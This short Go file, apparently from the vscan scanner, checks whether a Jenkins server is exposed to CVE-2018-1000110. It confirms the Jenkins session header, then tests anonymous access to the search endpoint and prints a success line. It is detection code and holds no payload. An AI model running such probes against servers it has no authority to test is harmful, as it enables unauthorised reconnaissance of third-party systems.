package jenkins

import (
	"fmt"
	"github.com/veo/vscan/pkg"
)

func CVE_2018_1000110(u string) bool {
	if req, err := pkg.HttpRequset(u, "GET", "", false, nil); err == nil {
		if req.Header.Get("X-Jenkins-Session") != "" {
			if req2, err := pkg.HttpRequset(u+"/search/?q=a", "GET", "", false, nil); err == nil {
				if req2.StatusCode == 200 {
					fmt.Printf("jenkins-exp-sucess|CVE_2018_1000110|%s\n", u)
					return true
				}
			}
		}
	}
	return false
}
